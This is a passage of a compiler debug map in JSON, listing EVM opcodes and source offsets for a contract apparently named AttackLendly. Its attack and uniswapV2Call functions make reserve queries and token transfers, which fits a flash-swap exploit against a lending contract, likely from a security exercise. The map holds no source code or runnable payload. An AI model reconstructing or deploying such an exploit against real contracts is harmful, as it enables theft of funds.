      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE2D"
    },
    "1460": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        3219,
        3268
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1461": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3219,
        3268
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1462": {
      "op": "POP"
    },
    "1463": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 12,
      "value": "0x40"
    },
    "1465": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1466": {
      "op": "PUSH4",
      "value": "0xA9059CBB"
    },
    "1471": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1473": {
      "op": "SHL"
    },
    "1474": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1475": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1476": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1478": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1480": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1482": {
      "op": "SHL"
    },
    "1483": {
      "op": "SUB"
    },
    "1484": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3306,
        3310
      ],
      "op": "PUSH32",
      "path": "3",
      "value": "0x0"
    },
    "1517": {
      "op": "DUP2"
    },
    "1518": {
      "op": "AND"
    },
    "1519": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "1521": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP4",
      "path": "3"
    },
    "1522": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "ADD",
      "path": "3"
    },
    "1523": {
      "op": "MSTORE"
    },
    "1524": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1526": {
      "op": "DUP3"
    },
    "1527": {
      "op": "ADD"
    },
    "1528": {
      "op": "DUP4"
    },
    "1529": {
      "op": "SWAP1"
    },
    "1530": {
      "op": "MSTORE"
    },
    "1531": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3297
      ],
      "op": "DUP6",
      "path": "3"
    },
    "1532": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3297
      ],
      "op": "AND",
      "path": "3"
    },
    "1533": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3297
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1534": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3297
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0xA9059CBB"
    },
    "1539": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3297
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1540": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1542": {
      "op": "ADD"
    },
    "1543": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x20"
    },
    "1545": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1547": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1548": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1549": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP4",
      "path": "3"
    },
    "1550": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "SUB",
      "path": "3"
    },
    "1551": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1552": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1554": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP8",
      "path": "3"
    },
    "1555": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "GAS",
      "path": "3"
    },
    "1556": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "CALL",
      "path": "3"
    },
    "1557": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1558": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1559": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1560": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x625"
    },
    "1563": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "1564": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1565": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1567": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1568": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "1569": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1570": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1572": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "REVERT",
      "path": "3"
    },
    "1573": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1574": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "POP",
      "path": "3"
    },
    "1575": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "POP",
      "path": "3"
    },
    "1576": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "POP",
      "path": "3"
    },
    "1577": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "POP",
      "path": "3"
    },
    "1578": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1580": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1581": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1582": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "1584": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "NOT",
      "path": "3"
    },
    "1585": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "1587": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1588": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "ADD",
      "path": "3"
    },
    "1589": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "AND",
      "path": "3"
    },
    "1590": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1591": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "ADD",
      "path": "3"
    },
    "1592": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1593": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1595": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1596": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "POP",
      "path": "3"
    },
    "1597": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1598": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "ADD",
      "path": "3"
    },
    "1599": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1600": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x649"
    },
    "1603": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1604": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1605": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE2D"
    },
    "1608": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        3278,
        3337
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1609": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1610": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3278,
        3337
      ],
      "op": "POP",
      "path": "3"
    },
    "1611": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3356,
        3372
      ],
      "op": "PUSH2",
      "path": "3",
      "statement": 13,
      "value": "0x652"
    },
    "1614": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3356,
        3370
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x9F4"
    },
    "1617": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "i",
      "offset": [
        3356,
        3372
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1618": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        3356,
        3372
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1619": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1915,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1620": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1915,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1621": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1915,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1622": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1915,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1623": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1915,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1624": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1915,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1625": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1915,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1626": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1627": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1628": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1629": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1630": {
      "fn": "AttackLendly.uniswapV2Call",
      "offset": [
        1780,
        3379
      ],
      "op": "POP",
      "path": "3"
    },
    "1631": {
      "fn": "AttackLendly.uniswapV2Call",
      "jump": "o",
      "offset": [
        1780,
        3379
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1632": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1633": {
      "offset": [
        1094,
        1107
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x668"
    },
    "1636": {
      "offset": [
        1094,
        1105
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xC65"
    },
    "1639": {
      "jump": "i",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1640": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1641": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1895,
        1925
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 14,
      "value": "0x672"
    },
    "1644": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1922,
        1923
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1646": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1895,
        1913
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xCBF"
    },
    "1649": {
      "fn": "Ownable.renounceOwnership",
      "jump": "i",
      "offset": [
        1895,
        1925
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1650": {
      "fn": "Ownable.renounceOwnership",
      "offset": [
        1895,
        1925
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1651": {
      "fn": "Ownable.renounceOwnership",
      "jump": "o",
      "offset": [
        1831,
        1932
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1652": {
      "fn": "AttackLendly.attack",
      "offset": [
        1067,
        1774
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1653": {
      "offset": [
        1094,
        1107
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x67C"
    },
    "1656": {
      "offset": [
        1094,
        1105
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xC65"
    },
    "1659": {
      "jump": "i",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1660": {
      "fn": "AttackLendly.attack",
      "offset": [
        1094,
        1107
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1661": {
      "fn": "AttackLendly.attack",
      "offset": [
        1115,
        1133
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1663": {
      "fn": "AttackLendly.attack",
      "offset": [
        1143,
        1160
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x60"
    },
    "1665": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1254
      ],
      "op": "PUSH32",
      "path": "3",
      "statement": 15,
      "value": "0x0"
    },
    "1698": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1700": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1702": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1704": {
      "op": "SHL"
    },
    "1705": {
      "op": "SUB"
    },
    "1706": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1266
      ],
      "op": "AND",
      "path": "3"
    },
    "1707": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1266
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0x902F1AC"
    },
    "1712": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1714": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1715": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1716": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH4",
      "path": "3",
      "value": "0xFFFFFFFF"
    },
    "1721": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "AND",
      "path": "3"
    },
    "1722": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0xE0"
    },
    "1724": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "SHL",
      "path": "3"
    },
    "1725": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1726": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1727": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x4"
    },
    "1729": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "ADD",
      "path": "3"
    },
    "1730": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x60"
    },
    "1732": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1734": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1735": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1736": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP4",
      "path": "3"
    },
    "1737": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "SUB",
      "path": "3"
    },
    "1738": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1739": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP7",
      "path": "3"
    },
    "1740": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "GAS",
      "path": "3"
    },
    "1741": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "STATICCALL",
      "path": "3"
    },
    "1742": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1743": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1744": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "ISZERO",
      "path": "3"
    },
    "1745": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x6DE"
    },
    "1748": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "JUMPI",
      "path": "3"
    },
    "1749": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1750": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1752": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1753": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "RETURNDATACOPY",
      "path": "3"
    },
    "1754": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1755": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x0"
    },
    "1757": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "REVERT",
      "path": "3"
    },
    "1758": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1759": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "POP",
      "path": "3"
    },
    "1760": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "POP",
      "path": "3"
    },
    "1761": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "POP",
      "path": "3"
    },
    "1762": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "POP",
      "path": "3"
    },
    "1763": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1765": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1766": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "RETURNDATASIZE",
      "path": "3"
    },
    "1767": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "1769": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "NOT",
      "path": "3"
    },
    "1770": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1F"
    },
    "1772": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1773": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "ADD",
      "path": "3"
    },
    "1774": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "AND",
      "path": "3"
    },
    "1775": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP3",
      "path": "3"
    },
    "1776": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "ADD",
      "path": "3"
    },
    "1777": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1778": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x40"
    },
    "1780": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "MSTORE",
      "path": "3"
    },
    "1781": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "POP",
      "path": "3"
    },
    "1782": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1783": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "ADD",
      "path": "3"
    },
    "1784": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1785": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x702"
    },
    "1788": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1789": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1790": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE84"
    },
    "1793": {
      "fn": "AttackLendly.attack",
      "jump": "i",
      "offset": [
        1250,
        1268
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1794": {
      "fn": "AttackLendly.attack",
      "offset": [
        1250,
        1268
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1795": {
      "op": "POP"
    },
    "1796": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1798": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1800": {
      "op": "PUSH1",
      "value": "0x70"
    },
    "1802": {
      "op": "SHL"
    },
    "1803": {
      "op": "SUB"
    },
    "1804": {
      "fn": "AttackLendly.attack",
      "offset": [
        1226,
        1268
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1805": {
      "fn": "AttackLendly.attack",
      "offset": [
        1226,
        1268
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1806": {
      "fn": "AttackLendly.attack",
      "offset": [
        1226,
        1268
      ],
      "op": "AND",
      "path": "3"
    },
    "1807": {
      "fn": "AttackLendly.attack",
      "offset": [
        1237,
        1245
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x2"
    },
    "1809": {
      "fn": "AttackLendly.attack",
      "offset": [
        1226,
        1268
      ],
      "op": "SSTORE",
      "path": "3"
    },
    "1810": {
      "fn": "AttackLendly.attack",
      "offset": [
        1226,
        1268
      ],
      "op": "AND",
      "path": "3"
    },
    "1811": {
      "fn": "AttackLendly.attack",
      "offset": [
        1227,
        1235
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x1"
    },
    "1813": {
      "fn": "AttackLendly.attack",
      "offset": [
        1226,
        1268
      ],
      "op": "DUP2",
      "path": "3"
    },
    "1814": {
      "fn": "AttackLendly.attack",
      "offset": [
        1226,
        1268
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1815": {
      "fn": "AttackLendly.attack",
      "offset": [
        1226,
        1268
      ],
      "op": "SSTORE",
      "path": "3"
    },
    "1816": {
      "fn": "AttackLendly.attack",
      "offset": [
        1369,
        1372
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 16,
      "value": "0x64"
    },
    "1818": {
      "fn": "AttackLendly.attack",
      "offset": [
        1369,
        1372
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1819": {
      "fn": "AttackLendly.attack",
      "offset": [
        1353,
        1366
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x725"
    },
    "1822": {
      "fn": "AttackLendly.attack",
      "offset": [
        1353,
        1366
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1823": {
      "fn": "AttackLendly.attack",
      "offset": [
        1364,
        1366
      ],
      "op": "PUSH1",
      "path": "3",
      "value": "0x63"
    },
    "1825": {
      "fn": "AttackLendly.attack",
      "offset": [
        1353,
        1366
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xDDE"
    },
    "1828": {
      "fn": "AttackLendly.attack",
      "jump": "i",
      "offset": [
        1353,
        1366
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1829": {
      "fn": "AttackLendly.attack",
      "offset": [
        1353,
        1366
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1830": {
      "fn": "AttackLendly.attack",
      "offset": [
        1353,
        1372
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0x72F"
    },
    "1833": {
      "fn": "AttackLendly.attack",
      "offset": [
        1353,
        1372
      ],
      "op": "SWAP2",
      "path": "3"
    },
    "1834": {
      "fn": "AttackLendly.attack",
      "offset": [
        1353,
        1372
      ],
      "op": "SWAP1",
      "path": "3"
    },
    "1835": {
      "fn": "AttackLendly.attack",
      "offset": [
        1353,
        1372
      ],
      "op": "PUSH2",
      "path": "3",
      "value": "0xE0B"
    },
    "1838": {
      "fn": "AttackLendly.attack",
      "jump": "i",
      "offset": [
        1353,
        1372
      ],
      "op": "JUMP",
      "path": "3"
    },
    "1839": {
      "fn": "AttackLendly.attack",
      "offset": [
        1353,
        1372
      ],
      "op": "JUMPDEST",
      "path": "3"
    },
    "1840": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "PUSH1",
      "path": "3",
      "statement": 17,
      "value": "0x40"
    },
    "1842": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "DUP1",
      "path": "3"
    },
    "1843": {
      "fn": "AttackLendly.attack",
      "offset": [
        1389,
        1407
      ],
      "op": "MLOAD",
      "path": "3"
    },
    "1844": {
